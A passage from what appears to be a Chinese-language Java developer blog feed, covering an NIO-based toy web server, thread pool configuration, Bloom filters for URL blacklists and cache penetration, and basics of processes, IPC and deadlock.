channel准备好接收新进入的连接称为“接收就绪”。某个channel成功连接到另一个服务器称为“连接就绪”。一个有数据可读的通道可以说是“读就绪”。等待写数据的通道可以说是“写就绪”。<br>所以只有OP_ACCEPT: 接收就绪是serviceSocketChannel使用的，其他三个都是socketChannel使用。</p><h4 id="2-配置服务器-1"><a href="#2-配置服务器-1" class="headerlink" title="2.配置服务器"></a>2.配置服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     /**</span><br><span class="line">         * 1. 创建Selector</span><br><span class="line">         */</span><br><span class="line">        Selector selector = Selector.open();</span><br><span class="line">        /**</span><br><span class="line">         * 2. 通过ServerSocketChannel创建channel通道</span><br><span class="line">         */</span><br><span class="line">        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();</span><br><span class="line">        /**</span><br><span class="line">         * 3. 为channel通道绑定监听端口</span><br><span class="line">         */</span><br><span class="line">        serverSocketChannel.bind(new InetSocketAddress(8000));</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * 4. **设置channel为非阻塞模式**</span><br><span class="line">         */</span><br><span class="line">        serverSocketChannel.configureBlocking(false);</span><br><span class="line">        /**</span><br><span class="line">         * 5. 将channel注册到selector上，监听连接事件</span><br><span class="line">         */</span><br><span class="line">        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line">        System.out.println(&quot;服务器启动成功！&quot;);</span><br></pre></td></tr></table></figure><p>总结一下上面代码，创建多路复用器，创建ServerSocketChannel，简称ssc，ssc绑定端口并设置为非阻塞，将ssc注册到多路复用器上，监听连接事件。到这里服务器已经配置好了。</p><h4 id="3-处理请求返回响应-1"><a href="#3-处理请求返回响应-1" class="headerlink" title="3.处理请求返回响应"></a>3.处理请求返回响应</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> /**</span><br><span class="line">    while (true) &#123;</span><br><span class="line">    int readyChannels = selector.select();</span><br><span class="line">    if (readyChannels == 0) &#123;</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">    Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">    Iterator iterator = selectionKeys.iterator();</span><br><span class="line"></span><br><span class="line">    while (iterator.hasNext()) &#123;</span><br><span class="line"></span><br><span class="line">        SelectionKey selectionKey = (SelectionKey) iterator.next();</span><br><span class="line"></span><br><span class="line">        if (selectionKey.isAcceptable()) &#123;</span><br><span class="line">            SocketChannel socketChannel = serverSocketChannel.accept();</span><br><span class="line">            socketChannel.configureBlocking(false);</span><br><span class="line">            socketChannel.register(selector, SelectionKey.OP_READ);</span><br><span class="line"></span><br><span class="line">            Response response = new Response(socketChannel);</span><br><span class="line"></span><br><span class="line">            response.print(&quot;&lt;html&gt;&quot;);</span><br><span class="line">            response.print(&quot;&lt;head&gt;&quot;);</span><br><span class="line">            response.print(&quot;&lt;title&gt;&quot;);</span><br><span class="line">            response.print(&quot;服务器响应成功&quot;);</span><br><span class="line">            response.print(&quot;&lt;/title&gt;&quot;);</span><br><span class="line">            response.print(&quot;&lt;/head&gt;&quot;);</span><br><span class="line">            response.print(&quot;&lt;body&gt;&quot;);</span><br><span class="line">            response.print(&quot;来而不往非礼也&quot;);</span><br><span class="line">            response.print(&quot;&lt;/body&gt;&quot;);</span><br><span class="line">            response.print(&quot;&lt;/html&gt;&quot;);</span><br><span class="line"></span><br><span class="line">            response.pushToBrowser(200);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (selectionKey.isReadable()) &#123;</span><br><span class="line">            Request request = new Request(selectionKey);</span><br><span class="line">        &#125;</span><br><span class="line">        iterator.remove();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h4><p>循环询问多路复用器的selectedKeys是否有值，等待连接事件<br>当有连接事件过来了，创建socketChannel<br>将socketChannel设置为非阻塞工作模式<br>将channel注册回selector上，监听<strong>可读事件</strong><br>创建Response并传入socketChannel，在Response里socketChannel.write();返回响应</p><p>如果是可读事件，把selectionKey传入Request解析请求，Request类首先selectionKey里获取socketChannel（就之前接入事件创建的socketChannel），然后创建byteBuffer，用于读取客户端请求信息。</p><h4 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a>5.其他</h4><p>Selector、ServerSocketChannel本身为抽象类，不能直接创建,需要通过open()方法打开。<br>注意这段代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (readyChannels == 0) &#123;</span><br><span class="line">           continue;&#125;</span><br></pre></td></tr></table></figure></p><p>最后献上教程，关于nio，<a href="http://www.imooc.com/learn/1118" target="_blank" rel="noopener">慕课有一个特别好的教程</a>，老师讲的很清楚。</p><h1 id="V3"><a href="#V3" class="headerlink" title="V3"></a>V3</h1><p>进行封装 request接受请求并打印。<br>response根据传入的状态码封装固定的头信息、推送响应信息。<br>server类只关心内容和状态码.</p>]]></content>
      
      
      <categories>
          
          <category> mytomcat </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java线程池详解</title>
      <link href="/2019/05/26/%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/05/26/%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="使用线程池的好处"><a href="#使用线程池的好处" class="headerlink" title="使用线程池的好处"></a>使用线程池的好处</h1><ol><li><strong>降低资源销毁</strong>。不用频繁的创建销毁线程，线程可以循环重复使用。</li><li><strong>提高响应速度</strong>。每当任务到达时，无需创建新线程。</li><li><strong>提高线程的可管理性</strong>。线程池可以统一分配、调优和监控。可以根据系统的承受能力，调整线程的数量，防止因为消耗过多内存导致服务器崩溃。</li></ol><h1 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h1><p>创建线程池有两种方法。一、构造方法创建。二、通过Executor框架的工具类Executors实现。</p><h2 id="一、构造方法创建"><a href="#一、构造方法创建" class="headerlink" title="一、构造方法创建"></a>一、构造方法创建</h2><p>在ThreadPoolExecutor类中提供了四个构造方法。</p><blockquote><p>public ThreadPoolExecutor(<strong>int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,BlockingQueue<runnable> workQueue</runnable></strong>);</p><p>   public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,BlockingQueue<runnable> workQueue,<strong>ThreadFactory threadFactory</strong>);</runnable></p><p>   public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,BlockingQueue<runnable> workQueue,<strong>RejectedExecutionHandler handler)</strong>;</runnable></p><p>   public ThreadPoolExecutor(int corePoolSize,int maximumPoolSize,long keepAliveTime,TimeUnit unit,BlockingQueue<runnable> workQueue,<strong>ThreadFactory threadFactory,RejectedExecutionHandler handler</strong>);</runnable></p></blockquote><h3 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h3><p>这里使用了上面构造方法的第一种进行创建一个线程池<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ThreadPoolExecutor threadPool= new ThreadPoolExecutor(</span><br><span class="line">        10, 15, 60, TimeUnit.SECONDS,new LinkedBlockingQueue&lt;Runnable&gt;(1024));</span><br></pre></td></tr></table></figure></p><p>第一个参数corePoolSize=10 表示这个线程池初始化了10个线程在里面工作<br>第二个参数maximumPoolSize=15 表示如果10个线程不够用了，就会自动增加到最多15个线程<br>第三个参数keepAliveTime=60 结合第四个参数TimeUnit.SECONDS，表示经过60秒，多出来的线程还没有接到活儿，就会回收，最后保持池子里就10个<br>第四个参数TimeUnit.SECONDS 第三参数的单位为秒，有7种静态属性。<br>第五个参数 new LinkedBlockingQueue() 用来放任务的集合。有三个选择   </p><ul><li>ArrayBlockingQueue;</li><li>LinkedBlockingQueue;</li><li>SynchronousQueue;</li></ul><h3 id="拒绝策略"><a href="#拒绝策略" class="headerlink" title="拒绝策略"></a>拒绝策略</h3><p>handler：表示当处理任务时的四种拒绝策略：</p><ul><li>ThreadPoolExecutor.AbortPolicy:丢弃任务并<strong>抛出RejectedExecutionException异常</strong>。</li><li>ThreadPoolExecutor.DiscardPolicy：丢弃任务（<strong>当前将要加入队列的任务</strong>），但是不抛出异常。</li><li>ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列<strong>最老的任务</strong>，然后重新尝试执行任务，即重复此过程。</li><li>ThreadPoolExecutor.CallerRunsPolicy：<strong>由调用线程处理该任务</strong></li></ul><h2 id="二、通过Executor框架的工具类Executors实现"><a href="#二、通过Executor框架的工具类Executors实现" class="headerlink" title="二、通过Executor框架的工具类Executors实现"></a>二、通过Executor框架的工具类Executors实现</h2><ul><li>newCachedThreadPool创建一个<strong>可缓存线程池</strong>，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。适合处理短时间工作任务。</li><li>newFixedThreadPool 创建一个<strong>定长线程池</strong>，可控制线程最大并发数，超出的线程会在队列中等待。</li><li>newScheduledThreadPool 创建一个<strong>定长线程池</strong>，支持<strong>定时或者周期性</strong>任务执行。</li><li>newSingleThreadExecutor 创建一个<strong>单线程化</strong>的线程池，它只会用唯一的工作线程来执行任务，如何有异常结束，会有另一个线程去取代它。保证所有任务<strong>按照指定顺序</strong>(FIFO, LIFO, 优先级)执行。</li><li>newWorkStealingPool:1.8版本出现，利用working-stealing算法，<strong>可窃取任务，并行处理</strong>，需要穿一个并行级别的参数，如果不传，则被设定为默认的CPU数量。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExecutorService c= Executors.newCachedThreadPool();</span><br><span class="line">ExecutorService f= Executors.newFixedThreadPool(3);</span><br><span class="line">ScheduledExecutorService s= Executors.newScheduledThreadPool(5);</span><br><span class="line">ExecutorService sin= Executors.newSingleThreadExecutor(); </span><br><span class="line">// 设置并行级别为2，即默认每时每刻只有2个线程同时执行</span><br><span class="line">ExecutorService m = Executors.newWorkStealingPool(2);</span><br></pre></td></tr></table></figure><h2 id="三、不要使用Executors默认创建线程池的方式"><a href="#三、不要使用Executors默认创建线程池的方式" class="headerlink" title="三、不要使用Executors默认创建线程池的方式"></a>三、不要使用Executors默认创建线程池的方式</h2><p>另外注意：不要使用Executors<strong>默认</strong>创建线程池的方式，这可能会导致OOM，因为LinkedBlockingQueue时未指定容量，将是一个无边界的阻塞队列，最大长度为Integer.MAX_VALUE。是可以不断的向队列中加入任务的，这种情况下就有可能因为任务过多而导致内存溢出问题。<br>上面提到的问题主要体现在newFixedThreadPool和newSingleThreadExecutor两个工厂方法上，并不是说newCachedThreadPool和newScheduledThreadPool这两个方法就安全了，这两种方式默认创建的最大线程数可能是Integer.MAX_VALUE，而创建这么多线程，必然就有可能导致OOM。<br>反例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ExecutorService executor = Executors.newFixedThreadPool(15);//不要这样做</span><br></pre></td></tr></table></figure><p>正例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ExecutorService executor = new ThreadPoolExecutor(</span><br><span class="line">10, 10,60L, TimeUnit.SECONDS,new ArrayBlockingQueue(10));</span><br></pre></td></tr></table></figure></p><h1 id="线程池类的社会关系"><a href="#线程池类的社会关系" class="headerlink" title="线程池类的社会关系"></a>线程池类的社会关系</h1><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p><code>ThreadPoolExecutor——&gt;AbstractExecutorService——&gt;ExecutorService——&gt;Executor</code><br>线程池类ThreadPoolExecutor在包java.util.concurrent下， 继承了AbstractExecutorService 抽象类，该抽象类实现了ExecutorService接口，而该接口继承了Executor接口</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>Executor是一个顶层接口，在它里面只声明了一个方法execute(Runnable)，返回值为void，参数为Runnable类型，从字面意思可以理解，就是用来执行传进去的任务的；<br>ExecutorService接口声明了一些方法：submit、invokeAll、invokeAny以及shutDown等；<br>抽象类AbstractExecutorService基本实现了ExecutorService中声明的所有方法；<br>在ThreadPoolExecutor类中有几个非常重要的方法：</p><ul><li>execute()</li><li>submit()</li><li>shutdown()</li><li>shutdownNow()</li></ul><p>execute()可以向线程池提交一个任务。<br>submit()也是用来向线程池提交任务的，但是它和execute()方法不的是能够返回任务执行的结果，去看submit()方法的实现，会发现它实际上还是调用的execute()方法，只不过它利用了Future来获取任务执行结果。<br>shutdown()和shutdownNow()是用来关闭线程池的。</p><h1 id="线程池的状态（5种）"><a href="#线程池的状态（5种）" class="headerlink" title="线程池的状态（5种）"></a>线程池的状态（5种）</h1><p>其中AtomicInteger变量ctl的功能非常强大：利用低29位表示线程池中线程数，通过高3位表示线程池的运行状态：<br>1、<strong>RUNNING</strong>：-1 &lt;&lt; COUNT_BITS，即高3位为111，该状态的线程池会接收新任务，并处理阻塞队列中的任务；<br>2、<strong>SHUTDOWN</strong>： 0 &lt;&lt; COUNT_BITS，即高3位为000，该状态的线程池不会接收新任务，但会处理阻塞队列中的任务；<br>3、<strong>STOP</strong> ： 1 &lt;&lt; COUNT_BITS，即高3位为001，该状态的线程不会接收新任务，也不会处理阻塞队列中的任务，而且会中断正在运行的任务；<br>4、<strong>TIDYING</strong> ： 2 &lt;&lt; COUNT_BITS，即高3位为010，该状态表示线程池对线程进行整理优化；<br>5、<strong>TERMINATED</strong>： 3 &lt;&lt; COUNT_BITS，即高3位为011，该状态表示线程池停止工作；</p><h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>线程池中的核心线程数，当提交一个任务时，线程池创建一个新线程执行任务，直到当前线程数等于corePoolSize；<br>如果当前线程数为corePoolSize，继续提交的任务被保存到阻塞队列中，等待被执行；如果阻塞队列满了，那就创建新的线程执行当前任务；<br>直到线程池中的线程数达到maxPoolSize,这时再有任务来，只能执行reject()处理该任务。</p><h1 id="如何合理配置线程池的大小？"><a href="#如何合理配置线程池的大小？" class="headerlink" title="如何合理配置线程池的大小？"></a>如何合理配置线程池的大小？</h1><p>根据《Java并发编程实战》对于计算密集型的任务，在拥有N个处理器的系统上，当线程池的大小为N+1时，通常能实现最优的效率。(即使当计算密集型的线程偶尔由于缺失故障或者其他原因而暂停时，这个额外的线程也能确保CPU的时钟周期不会被浪费。)</p><p>如果是CPU密集型任务，就需要尽量压榨CPU，参考值可以设为 <strong>NCPU+1</strong><br>如果是IO密集型任务（比如数据库数据交互、文件上传下载、网络数据传输等等），参考值可以设置为<strong>2*NCPU</strong><br><em>tips：这行代码可以查看Ncpu<br><code>System.out.println(Runtime.getRuntime().availableProcessors());//输出运行时可用处理器</code></em></p><blockquote><p>参考博文<br><a href="https://www.cnblogs.com/dolphin0520/p/3932921.html" target="_blank" rel="noopener">这篇比较详细，还有源码解读</a><br><a href="https://www.cnblogs.com/leipDao/p/8436380.html" target="_blank" rel="noopener">关于ThreadFactory与BlockingQueue</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>布隆过滤器</title>
      <link href="/2019/04/16/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2019/04/16/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>布隆过滤器应用于最近比较火的海量处理问题。可以快速判断一个元素在不在海量数据的集合当中。缺点是有一定的失误率，优势是占用内存较少。<br><a id="more"></a><br>这篇文章我也同时发布在荣哥的公众号，搬砖攻城狮。<a href="https://mp.weixin.qq.com/s?__biz=MzUzNjk5NDk1OQ==&amp;mid=2247483707&amp;idx=1&amp;sn=fd9d8f04edc085a9d60511fd5513fd0d&amp;chksm=faecf4dbcd9b7dcd3dde98e71e2f447cdeb98f8b5c6a776eb7344c267bab6351c5cde169e527&amp;mpshare=1&amp;scene=1&amp;srcid=0429kbCkM8nl32g91u4cjwOE&amp;pass_ticket=o7Y28LwCkECdew2CB9ZmY%2BKd3rs%2BvSQamorjwZdBJfHahNMblqC42vSiDnvNcg%2F2#rd" target="_blank" rel="noopener">公众号推文</a></p><h2 id="0一道大数据黑名单题"><a href="#0一道大数据黑名单题" class="headerlink" title="0一道大数据黑名单题"></a>0一道大数据黑名单题</h2><p>不安全网页的黑名单里有100亿个URL，每一个网页的URL最多占用64B。要求实现一种过滤系统，可以根据网页的URL判断是否在这个黑名单中。要求的额外的空间不能超过30GB。</p><h2 id="1布隆过滤器是什么？"><a href="#1布隆过滤器是什么？" class="headerlink" title="1布隆过滤器是什么？"></a>1布隆过滤器是什么？</h2><p>布隆过滤器本质上是一个bit数组，可以用极少的空间解决“判断在不在”这种问题。<br>以这道题为例，一般的思路是将所有的URL整个都存储起来，<strong>但是这个题目其实只需要我们判断在不在，我们根本无需存整个URL，甚至无需在意一个URL是多少字节，只需要存这个URL是“在”还是“不在”这两种状态就好了。</strong><br>讲到这里不知读者有没联想我们计算机世界的0和1。我们完全可以用一个容器存放这两种状态，在黑名单URL用1来表示，不在黑名单用0来表示。<br>接下来我们就使用布隆过滤器着手解决这道题。首先创建一个bit数组，数组里所有位置初始化都为0。然后100亿个URL每一个都做hash运算，每一次得出的结果在bit数组对应的下标位置把0变成1。有URL对应的数组位置会被我们“标记”。当100亿个URL改变了bit数组里对应位置的值后，就得到我们所需要的布隆过滤器。<br><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/bitmap1" alt="布隆过滤器"></p><p>重头戏来了，当我们需要判断一个URL在不在黑名单里，只需要判断URL在经过hash函数后对应的bit数组下标的位置是“0”还是“1”。<br>如果对应位置是0，意味这个位置仍是初始化状态，没有被标记过，所以这个URL不在黑名单里。如果对应位置是1，意味这个位置已经被标记过，所以这个URL在黑名单里。<br>讲到这里，读者可能已经有一个“布隆过滤器器就是一个bit数组的”模糊全局概念。因为以上描述只是为了让读者知道布隆过滤器是个啥。接下来，请看几个布隆过滤的重要知识点。</p><h2 id="2hash函数"><a href="#2hash函数" class="headerlink" title="2hash函数"></a>2hash函数</h2><p>上面所提到的“100亿个URL每一个都做hash运算”，这里的hash运算在实际中不只是一个hash函数，而是<strong>一组hash函数</strong>。顺便说一句hash函数不需要自己实现，经典的哈希函数已经有很多了，比如MD5、SHAI。<br>但为什么URL经过hash函数的出来的值一定会是bit数组下标？打个比方，一个最简单的hash运算：%3。集合里的数经过%3的hash运算后，是只可能得出0或1或2，这三种情况。也就是说hash运算得出的输出域是固定的。这是hash函数的一个重要性质：<strong>哈希函数有无限的输入域，但只有固定有限输出域。</strong></p><h2 id="3布隆过滤器误判类型"><a href="#3布隆过滤器误判类型" class="headerlink" title="3布隆过滤器误判类型"></a>3布隆过滤器误判类型</h2><p>布隆过滤器是有一定失误率。它的误判类型是——<strong>宁可错杀一百，也不能放过一个</strong>。也就是说如果URL在黑名单，判断结果一定会表示在。可能失误的情况是：某个URL不在黑名单里，也被判断在。<br>为什么布隆过滤器会失误？并且只会“冤枉”，不会“漏判”？这是因为hash函数的另一个性质：<strong>不同的输入值hash运算后得到的散列输出值可能不同</strong>，也可能相同。但是不同的散列输出值对应的输入值一定不同。<br>假如要判断的两个URLhash运算得到了相同的结果，但一个在黑名单里，一个不在黑名单里，对应的数组下标位置已经被描黑，那么两个URL都会被判为在黑名单里。</p><h2 id="4计算误判率"><a href="#4计算误判率" class="headerlink" title="4计算误判率"></a>4计算误判率</h2><p>误判率与数组长度、哈希函数的个数成负相关，与样本量成正相关。<br>举一个极端的例子，如果样本量很大而bit数组太小，经过100亿和URL的标记后，数组里的所有元素都被“描黑”。此时任意一个URL都会被判断在黑名单里。<br>想要减少失误率就需根据三个公式设计一个长度合适的bit数组。<br>还是上面那道题为例，n是样本量，即100亿；p预期失误率，即0.0001，m是数组元素个数。01<br>公式一：计算布隆过滤器的大小把p和n代入公式match，lnp等于-9.21，（ln2）的平方是0.7，n是100亿计算出来m等于19.19n，转为GB,等于bit数组大小要开25G02<br><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/bitmap2.jpg" alt="公式一"></p><p>公式二：我们还得确定hash函数的个数，哈希函数的个数k公式:算出k为14，需要14个hash函数03<br><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/bitmap3.jpg" alt="公式二"></p><p>公式三：计算失误率，p公式：算出失误率是0.006%。还是以上面那道题目为例，如果布隆过滤器的大小开25g，那么有0.006%的失误率，内存和失误率都满足要求。”<br><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/bitmap4.jpg" alt="公式三"></p><p>附注：这里本来有三张公式图的，但在markdown放图片太麻烦了，如果想看可以去<a href="https://mp.weixin.qq.com/s?__biz=MzUzNjk5NDk1OQ==&amp;mid=2247483707&amp;idx=1&amp;sn=fd9d8f04edc085a9d60511fd5513fd0d&amp;chksm=faecf4dbcd9b7dcd3dde98e71e2f447cdeb98f8b5c6a776eb7344c267bab6351c5cde169e527&amp;mpshare=1&amp;scene=1&amp;srcid=0429kbCkM8nl32g91u4cjwOE&amp;pass_ticket=o7Y28LwCkECdew2CB9ZmY%2BKd3rs%2BvSQamorjwZdBJfHahNMblqC42vSiDnvNcg%2F2#rd" target="_blank" rel="noopener">公众号推文上看。</a></p><h2 id="5扩展"><a href="#5扩展" class="headerlink" title="5扩展"></a>5扩展</h2><p>布隆过滤器可以解决许多问题，比如：<strong>网页URL的去重，缓存穿透，垃圾邮件的判别</strong>等问题。<br>这里重点介绍一下布隆过滤器如何解决缓存穿透的问题。<strong>缓存穿透</strong>，简单来说就是因为有海量的不存在的key请求，导致缓存起不了作用，大量请求引向数据库，导致数据库宕机。<br>当有人恶意攻击，把发起海量的不存在的key请求，由于都是不存在的请求，缓存自然查不到，这些海量的请求就会都会落到数据库中。导致数据库崩溃。<br>一般解决方案是：缓存空数据，如果某key数据库查询结果为空，则把这个不存在值的key也缓存起来，设置较短过期时间，当后续又出现该key时，就可以在缓存里查询到了，不再请求数据库。<br>但是如果有人恶意攻击，key是随机生存的，请求的key是大量而不重复，这样的做法就用处不大了。<br>用布隆过滤器解决：是请求过来，先调用布隆过滤器判断数据是否存在。如果不存在的数据，就不要把请求引向数据库。直接过滤掉了大量不存在的数据攻击。<br><strong>总的来说，当数据量比较大并且重复率不高的时候，布隆过滤器的成本比一般解决方案成本更低。</strong></p><h2 id="6练练手"><a href="#6练练手" class="headerlink" title="6练练手"></a>6练练手</h2><p>看了这篇文章，不如乘热打铁，做道题目看看感觉如何<br><u><em>题目：32位无符号整数的范围是0 - 4294967295，现在有一个正好包含40亿个无符号整数的文件，所以在整个范围中必然有没出现过的数。可以使用最多1GB的内存，怎么找到所有出现过两次的数？在看答案前，请自己试着做一做吧</em></u>！</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>多线程基础概念</title>
      <link href="/2019/02/11/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/2019/02/11/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><h2 id="进程和线程的关系与区别？"><a href="#进程和线程的关系与区别？" class="headerlink" title="进程和线程的关系与区别？"></a>进程和线程的关系与区别？</h2><p>进程是资源分配的最小单元。线程是CPU调度的最小单元，一个Java程序对应着一个进程。</p><table><thead><tr><th>对比维度</th><th>多进程</th><th>多线程</th><th>总结</th></tr></thead><tbody><tr><td>数据共享、同步</td><td>数据共享复杂，需要用IPC；数据是分开的，同步简单</td><td>因为共享进程数据，数据共享简单，但也是因为这个原因导致同步复杂</td><td>各有优势</td></tr><tr><td>内存、CPU</td><td>占用内存多，切换复杂，CPU利用率低</td><td>占用内存少，切换简单，CPU利用率高</td><td>线程占优</td></tr><tr><td>创建销毁、切换</td><td>创建销毁、切换复杂，速度慢</td><td>创建销毁、切换简单，速度很快</td><td>线程占优</td></tr><tr><td>编程、调试</td><td>编程简单，调试简单</td><td>编程复杂，调试复杂</td><td>进程占优</td></tr><tr><td>可靠性</td><td>进程间不会互相影响</td><td>一个线程挂掉将导致整个进程挂掉</td><td>进程占优</td></tr><tr><td>分布式</td><td>适应于多核、多机分布式；如果一台机器不够，扩展到多台机器比较简单</td><td>适应于多核分布式</td><td>进程占优</td></tr></tbody></table><h2 id="进程间的通信方式"><a href="#进程间的通信方式" class="headerlink" title="进程间的通信方式"></a>进程间的通信方式</h2><ol><li>管道pipe：管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系的进程间使用。进程的亲缘关系通常是指父子进程关系。</li><li>命名管道FIFO：有名管道也是半双工的通信方式，但是它允许无亲缘关系进程间的通信。</li><li>消息队列MessageQueue：消息队列是由消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。</li><li>共享存储SharedMemory：共享内存就是映射一段能被其他进程所访问的内存，这段共享内存由一个进程创建，但多个进程都可以访问。共享内存是最快的 IPC 方式，它是针对其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号量，配合使用，来实现进程间的同步和通信。</li><li>信号量Semaphore：信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。因此，主要作为进程间以及同一进程内不同线程之间的同步手段。</li><li>套接字Socket：套解口也是一种进程间通信机制，与其他通信机制不同的是，它可用于不同进程间的进程通信。</li><li>信号 ( sinal ) ： 信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生。</li></ol><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p>死锁是指两个或两个以上的事务在执行过程中，因争夺锁资源而造成的一种互相等待的现象，若无外力作用两个事务都无法推进，这样就产生了死锁。</p><h2 id="四个必要条件"><a href="#四个必要条件" class="headerlink" title="四个必要条件"></a>四个必要条件</h2><p>四个条件缩写”一球夺环“</p><ol><li>互斥条件：即任何时刻，一个资源只能被一个进程使用。其他进程必须等待。</li><li>请求和保持条件：即当资源请求者在请求其他的资源的同时保持对原有资源的占有且不释放。</li><li>不剥夺条件：资源请求者不能强制从资源占有者手中夺取资源，资源只能由资源占有者主动释放。</li><li>环路等待条件：比如A占有B在等待的资源（B等待A释放），B占有A在等待的资源（A等待B释放）。多个进程循环等待着相邻进程占用着的资源。</li></ol><p>避免死锁可以通过破环四个必要条件之一。</p><h2 id="解决死锁的方法"><a href="#解决死锁的方法" class="headerlink" title="解决死锁的方法"></a>解决死锁的方法</h2><ol><li>加锁顺序保持一致。不同的加锁顺序很可能导致死锁，比如哲学家问题：A先申请筷子1在申请筷子2，而B先申请筷子2在申请筷子1，最后谁也得不到一双筷子（同时拥有筷子1和筷子2）</li><li>超时，为其中一个事务设置等待时间，若超过这个阈值事务就回滚，另一个等待的事务就能得以继续执行。比如可重入锁的超时等待</li><li>数据库可以及时检测出死锁，选择一个牺牲者放弃事务，即回滚undo量最小的事务。一般是用等待图（wait-for gragh）深度优先搜索的算法实现，如果图中有环路就说明存在死锁。</li></ol><h2 id="死锁、活锁与饥饿"><a href="#死锁、活锁与饥饿" class="headerlink" 